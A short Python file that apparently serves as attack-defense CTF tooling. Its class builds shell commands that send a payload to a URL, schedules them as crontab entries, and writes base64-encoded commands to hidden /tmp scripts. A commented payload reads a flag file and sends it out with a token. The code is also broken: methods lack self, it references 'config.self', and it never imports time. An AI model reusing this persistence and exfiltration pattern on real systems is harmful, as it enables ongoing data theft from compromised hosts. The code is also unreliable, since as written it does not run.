import hashlib
import base64
class CmdBuilder:
    def __init__(self,cmd_tpl):
        self.cmd_tpl=cmd_tpl
    def buildShByModel(url,payload,httpType='default'):
        return config.self.cmd_tpl[httpType].format(url,payload)
    def buildCrontab(interval,url,payload,httpType=0):
        #payload='flag="$(cat /home/web/flag/flag)"&token={token}'
        model=buildShByModel(url,payload,httpType)
        raw= f"{interval} * * * * {model}"
        return raw
    def buildCmd(rawCmd):
        raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
        md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
        return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d  | /bin/cat > /tmp/{md5Str}.sh',md5Str
